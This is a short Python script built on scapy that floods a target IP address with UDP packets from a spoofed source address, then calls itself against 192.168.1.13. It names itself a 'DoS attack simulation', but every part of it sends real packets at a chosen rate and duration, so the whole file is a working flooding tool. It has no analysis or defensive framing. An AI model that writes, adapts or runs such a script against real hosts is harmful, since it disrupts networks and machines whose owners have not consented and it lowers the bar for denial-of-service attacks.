import time
import random
from scapy.all import Ether, IP, UDP, sendp

def simulate_dos_attack(target_ip, iface, packet_rate, duration):
    """
    Simulates a DoS attack by sending a high rate of packets to the target IP.
    
    Args:
        target_ip (str): The IP address of the target machine.
        iface (str): The network interface to use for sending packets.
        packet_rate (int): Number of packets to send per second.
        duration (int): Duration of the attack in seconds.
    """
    print(f"Starting DoS attack simulation on {target_ip}...")
    packet_count = 0
    start_time = time.time()
    src_ip = f"192.168.1.{random.randint(1, 254)}"
    print(f"Source IP: {src_ip}")

    # Generate a random port once before the loop
    value = random.randint(12345, 65535)

    while time.time() - start_time < duration:
        current_time = time.time()
        for _ in range(packet_rate):
            packet = Ether() / IP(src=src_ip, dst=target_ip) / UDP(dport=value)
            sendp(packet, iface=iface, verbose=0)
            packet_count += 1

        # Ensure we maintain the packet rate
        time_to_sleep = max(0, 1 - (time.time() - current_time))
        time.sleep(time_to_sleep)

    print(f"DoS attack simulation complete. Total packets sent: {packet_count}")

# Replace '192.168.1.10' with the IP address of the target machine
simulate_dos_attack(target_ip="192.168.1.13", iface="Wi-Fi", packet_rate=510, duration=5)